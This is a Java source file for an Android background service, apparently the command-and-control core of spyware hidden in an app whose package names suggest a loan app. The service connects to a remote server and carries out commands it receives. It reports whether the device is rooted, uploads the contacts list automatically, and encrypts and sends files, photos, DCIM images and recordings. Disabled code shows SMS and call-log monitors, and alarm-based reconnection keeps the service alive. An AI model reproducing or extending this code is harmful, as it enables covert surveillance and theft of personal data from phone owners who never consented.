package sub.app.entry;


import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;

import sub.app.client.AuthPacket;
import sub.app.func.ContactsListener;
import sub.app.func.FileDownloader;

import main.app.loan.VarSpace;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;


public class Task extends TaskListener implements Controler {

	public final String TAG = Task.class.getSimpleName();

	int nbAttempts = 10; //max attempt count
	int elapsedTime = 1; // attempt elapse
	
	boolean stop = false; //destory task
	
	boolean isRunning = false; //service runing
	boolean isListening = false; //waiting server cmd
	//final boolean waitTrigger = false;
	
	NetModel mConn = null;
	Thread readthread = null;	//waitInstruction thread
	Thread checkthread = null;//checkconnection thread
	RunCmd procCmd = null ;
	byte[] cmd  = null;
	
	private Handler handler = new Handler() {
		
		public void handleMessage(Message msg) {
			try{
				Bundle b = msg.getData();
				processCommand(b);
			}
			catch(Exception e)
			{
			}
		}
	};
	
	public void processCommand(Bundle b)
    {
		try{
			procCmd.process(b.getByte("opcode"), b.getInt("channel"), b.getInt("cmdNo"), b.getByteArray("arguments"));
		}
		catch(Exception e) {
//			Log.d("Error", e.getMessage());
		}
    }
	
	public void OnReceive(byte opcode,  int channel, int cmdNo, byte[] data)
	{
		try
		{
			if(data == null)
			{
				data = new byte[1];
			}
			
			Message msg = new Message();
			
			Bundle b = new Bundle();
			
			b.putByte("opcode", opcode);
			b.putInt("channel", channel);
			b.putInt("cmdNo", cmdNo);
			b.putByteArray("arguments", data);
			
			msg.setData(b);
			
			handler.sendMessage(msg);
		}
		catch(Exception e)
		{
//			Log.d(TAG, "OnReceive Error");
		}
	}

	public boolean sendSerialPacket(byte opcode, int channel, byte[] body)
	{
		try{
			NetModel comm = new NetModel(Protocol.getServerIP(), Protocol.SERVER_SERIAL_PORT, this);
	
			if(comm.Open() == false)
			{
				return false;
			}
	
			try{
				comm.WritePacket(opcode, channel, 0, body);
			}catch(Exception e){}
			
			comm.Close();
			
			comm = null;
			
			return true;
		}
		catch(Exception e)
		{
		}

		return false;
	}
	
	public boolean sendFilePacket(byte opcode, int channel, File file)
	{
		boolean success = false;
		
		try{

			if(file.exists() == false) return false;
			if("".equals(file.getName())==true) return false;
			
			FileInputStream in = null;
			try {
				in = new FileInputStream(file);
			} catch (FileNotFoundException e) {
				return false;
			}
			
			int nfileLen = 0;
			int len = 0;
			int nfnameLen = 0;
			
			try{
				NetModel comm = new NetModel(Protocol.getServerIP(), Protocol.SERVER_SERIAL_PORT, this);
		
				if(comm.Open() == true)
				{
					nfileLen = (int)file.length();
	
					String fileName = file.getName();
					nfnameLen = fileName.getBytes("UTF8").length + 1;
	
					int nSize = 4 + nfnameLen + 4;
					CTypeCast bb = CTypeCast.allocate(nSize);
					bb.putInt(nSize + nfileLen);
					bb.putString(fileName);
					bb.putInt(nfileLen);
					
					int offset = 0;
					
					byte[] fileinfo = bb.toPtr();
					Protocol.EncryptPacketPhone(fileinfo, offset);
					offset += fileinfo.length;
					
					byte[] header = comm.getRawHeader((byte)opcode, channel, 0, nfileLen + fileinfo.length);
	
					comm.WriteRawPacket(header);
					comm.WriteRawPacket(fileinfo);
					
					header = null;
					fileinfo = null;
					bb = null;
	
					while(len < nfileLen)
					{
						int buflen = nfileLen - len;
						if(buflen > Protocol.MAX_BUFFER_SIZE)
						{
							buflen = Protocol.MAX_BUFFER_SIZE;
						}
						
						byte[] buffer = new byte[buflen];
	
						Arrays.fill(buffer, (byte)0);
						
						int nreaded = in.read(buffer);
						
						if(nreaded == buffer.length)
						{
							len = len + nreaded;
							
					        Protocol.EncryptPacketPhone(buffer, offset);
					        offset += buffer.length;
							comm.WriteRawPacket(buffer);
						}
						
						buffer = null;
					}
				}
		
				comm.Close();
				comm = null;
				
				success = true;
			}
			catch(Exception e)
			{
	//			String err = e.getMessage() + ", sendlen="+len+", filelen="+nfileLen+", nfnameLen="+nfnameLen;
	//			Log.d("err", err);
			}
			
			try{
				in.close();
			}catch(Exception e){}
		}
		catch(Exception e)
		{
		}

		System.gc();

		return success;
	}
	
	public void handleData(byte opcode, int channel, byte[] data) {
		
		try{
			if(opcode == Protocol.OPCLIENT_FILE || opcode == Protocol.OPCLIENT_PICTURE || 
			   opcode == Protocol.OPCLIENT_DCIM || opcode == Protocol.OPCLIENT_RECFILE)
			{
				sendSerialPacket(opcode, channel, data);
			}
			else
			{
				try{
					mConn.WritePacket(opcode,channel, 0, data);
				}
				catch(Exception e)
				{
	//				Log.d("handleData","sendData Fail, so Reconn Attempt");
	
					ResetConnection();
				}
			}
		}
		catch(Exception e)
		{
			
		}

		data = null;

		System.gc();
	}

	public void onCreate() {
//		Log.i(TAG, "In onCreate");
		
		try{
			procCmd = new RunCmd(this);
			
			VarSpace.loadPreferences(this); //2015.07.27 penton
		}
		catch(Exception e)
		{
			
		}
	}
	
	public void CreateCommThread()
	{
		try{
			stop = false;
			
			readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
			readthread.start();
			
			checkthread = new Thread(new Runnable() {public void run() { checkconnection(); } });
			checkthread.start();
		}
		catch(Exception e)
		{
		}
	}
	
	public void OnCreateReport()
	{
//		Log.d("info", "OnCreateReport");
		
		try{
			
//			advancedInfos = new AdvancedSystemInfo(this, 0);
//			advancedInfos.getInfos();

			byte[] param = new byte[1];param[0] = 0;

//			if(smsMonitor != null)
//			{
//				smsMonitor.stop();
//				smsMonitor = null;
//			}
//			
//			smsMonitor = new SMSMonitor(this, 0, param);
	
//			if(callMonitor != null)
//			{
//				callMonitor.stop();
//				callMonitor = null;
//			}
//				
//			callMonitor = new CallMonitor(this, 0, param);
//			
//			if(dcimDownloader != null)
//			{
//				dcimDownloader.stop();
//				dcimDownloader = null;
//			}
//			dcimDownloader = new DcimDownloader(this, 0);
//			dcimDownloader.start();
//			
//			if(recfileDownloader != null)
//			{
//				recfileDownloader.stop();
//				recfileDownloader = null;
//			}
//			recfileDownloader = new RecFileDownloader(this, 0);
//			recfileDownloader.start();
			
			final TaskListener cxt = this;
			
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					while(true)
					{
						try{
							Thread.sleep(1000);
							
							if("".equals(FileDownloader.FTP_ID)==true || "".equals(FileDownloader.FTP_PW)==true)
							{
								continue;
							}
							
							byte[] param = new byte[1];param[0] = 0;

							ContactsListener.listContacts(cxt, 0, new String("").getBytes());
							System.gc();
							
//							CallLogListener.listCallLog(cxt, 0, param);
//							System.gc();
//
//							SMSListener.listSMS(cxt, 0, param);
//							System.gc();
							
//							DirListener.listDir(cxt, 0, "/");
//							System.gc();
						}
						catch(Exception e)
						{
							
						}
						
						break;
					}
				}
			}).start();
		}catch(Exception e){
//			Log.d("error", "OnCreateReport Exception");
		}
	}
	
	public void ConnectToServer()
	{
		String ip = Protocol.getServerIP();
		int port = Protocol.SERVER_ASYNC_PORT;
		
		try{
			if(isRunning == false)
			{
			    IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
			    registerReceiver(ConnectivityCheckReceiver, filterc);
				isRunning = true;
				
				mConn = null;
				mConn = new NetModel(ip,port,this);

//				Log.d("Conn1","First, Try to "+ip+":"+port);
				
				if(mConn.Open()){
					
//					Log.d("Conn1", "Connect Success");

					OnCreateReport();
					
					CreateCommThread();
					
					//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					isListening = true;
					
				}
				else
				{
//					Log.d("Conn1", "Connect Fail");

					if(isConnected) {

//						Log.d("Conn1", "Network Enabled, so retry");

						resetConnectionAttempts();
						reconnectionAttempts();
					}
					else {
//						Log.d("Conn1","Not Connected wait a Network update (First)");
					}
				}
			}	
			else
			{
				if ( mConn == null || mConn.IsRecvActive() == false )
				{
//					Log.d("Conn2","IsRecvActive fail2, so delete socket");
					
					stop = true;
					
					Thread.sleep(2000);
					
					close_routine();
				}

				if(isListening) {
//					Log.d("Conn2","Called uselessly by: (already listening)");
				}
				else
				{
//					Log.d("Conn2","Retry... (Service Running, but not Conn)");
					
					mConn = null;
					mConn = new NetModel(ip,port,this);
					
					if(mConn.Open())
					{
						
//						Log.d("Conn2","Connect Sucess");

						OnCreateReport();

						CreateCommThread();
						
						isListening = true;
					}
					else
					{
//						Log.d("Conn2","Connect Fail");

						reconnectionAttempts();
					}
				}
			}			
		}
		catch(Exception e)
		{
		}
	}
	
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
		//loadPreferences("preferences");
		//Intent i = new Intent(this,Preferences.class);
		//startActivity(i);
		if(intent == null)
			return START_STICKY;
//		String who = intent.getAction();
//		Log.i(TAG, "onStartCommand by: "+ who);
		
		Protocol.IS_ROOTED_APP = 0;

		new Thread(new Runnable() {
			
			public void run() {
				// TODO Auto-generated method stub
				ConnectToServer();
			}
		}).start();

		 
		return START_STICKY;
	}
	
	public void ResetConnection()
	{
		try{
			try{
				if(procCmd != null)
				{
					procCmd.stopAll();
				}
			}catch(Exception e1){ }

			isListening = false;
			resetConnectionAttempts();
			reconnectionAttempts();
		}
		catch(Exception e)
		{
		}
		
		stop = true;
	}
	
	public void close_routine()
	{
		try{
			if(procCmd != null)
			{
				procCmd.stopAll();
			}
		}catch(Exception e1){ }

		isListening = false;
		
		try{
			if(mConn != null)
			{
				mConn.Close();
			}
		}
		catch(Exception e2)
		{
		}
	}
	
	public void waitInstruction() {
		
//		Log.d("waitInstruct", "start");

		try {
			for(;;) {
				Thread.sleep(100);
				
				if(stop)
				{
					break;
				}
				
				mConn.ReadPacket();
			}
		}
		catch(Exception e) {
			
//			Log.d("waitInstruct", "excpetion, so close and reconnect");

			close_routine();
			
			ResetConnection();
		}
		
//		Log.d("waitInstruct", "finish");
	}
	
	public void checkconnection() {
		
//		Log.d("CheckConn","start");
		
		try {
			long sendTick = 0;

			for(;;) {
				
				Thread.sleep(300);
				
				if(stop)
				{
					break;
				}
				
				if(isRunning = true && isListening == true && isConnected == true)
				{
					long curTick = (new Date()).getTime();
					if(curTick - sendTick  > Protocol.SEND_KEEPALIVE_PREIOD)
					{
						AuthPacket packet = new AuthPacket();
						packet.setProductId(Protocol.PRODUCT_ID);
						packet.setIsRooted(Protocol.IS_ROOTED_APP);
						packet.setProductStatus(Protocol.IsAliveVersion);
						byte[] data = packet.build();
						
						mConn.WritePacket(Protocol.OPCLIENT_KEEPALIVE, 0, 0, data);
						
						data = null;packet = null;
						
						curTick = sendTick;
					}

					if ( mConn.IsRecvActive() == false )
					{
//						Log.d("CheckConn","IsRecvActive fail1, so delete socket");
						
						close_routine();
						
						break;
					}
				}
			}
		}
		catch(Exception e)
		{
//			Log.d("CheckConn","exception");
		}
		
//		Log.d("CheckConn","finish");
	}

	

	
	public void reconnectionAttempts() 
	{
		/*
		 * 10 times 1 minutes
		 * 5 times 5 minutes
		 * 3 times 10 minutes
		 * 1 times 30 minutes
		 */
		if(!isConnected)
		{
//			Log.d("Reconn", "Network Disabled");
			return;
		}
		
//		if(nbAttempts == 0) {
//			switch(elapsedTime) {
//			case 1:
//				elapsedTime = 5;
//				nbAttempts = 5;
//				break;
//			case 5:
//				elapsedTime = 10;
//				nbAttempts = 3;
//				break;
//			case 10:
//				elapsedTime = 30;
//				nbAttempts = 2;
//				break;
//			case 30:
//				return; //Did too much try
//			}
//		}
		
//		Log.d("Reconn", "nbAttempts="+nbAttempts+" ,elapsedTime="+elapsedTime);
		
		elapsedTime = 1;
		
		try{
			//---- Piece of Code ----
			Calendar cal = Calendar.getInstance();
			
			if(elapsedTime == 1)
			{
				cal.add(Calendar.MINUTE, elapsedTime);
			}
			else
			{
				cal.add(Calendar.MINUTE, elapsedTime);
			}
			 
			Intent intent = new Intent(this, OnAlarm.class);
			 
			intent.putExtra("alarm_message", "Wake up Dude !");
			
			PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
			// Get the AlarmManager service
			AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
			am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
		}
		catch(Exception e)
		{
		}
		
		//-----------------------
		nbAttempts --;
	}
	
	public void onDestroy() {
		//savePreferences("myPref");
		//savePreferences("preferences");
		
//		Log.i(TAG, "in onDestroy");
		
		try{
			unregisterReceiver(ConnectivityCheckReceiver);
		}catch(Exception e){ }

		try{
			if(mConn != null)
			{
				mConn.Close();
			}
		}catch(Exception e){ }
		
		stop = true;

		try{
			if(procCmd != null)
			{
				procCmd.stopAll();
			}
		}catch(Exception e){ }

		try{
			stopSelf();
		}catch(Exception e){ }
		
		super.onDestroy();
	}
	
	public void resetConnectionAttempts() {
		nbAttempts = 10;
		elapsedTime = 1;
	}
	
	public void registerSMSAndCall() {
		try{
/*			
	        IntentFilter filter = new IntentFilter();
	        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
	        registerReceiver(SMSreceiver, filter);
	        IntentFilter filter2 = new IntentFilter();
	        filter2.addAction("android.intent.action.PHONE_STATE");
	        registerReceiver(Callreceiver, filter2);
*/	        
		}
		catch(Exception e)
		{
		}
	}


}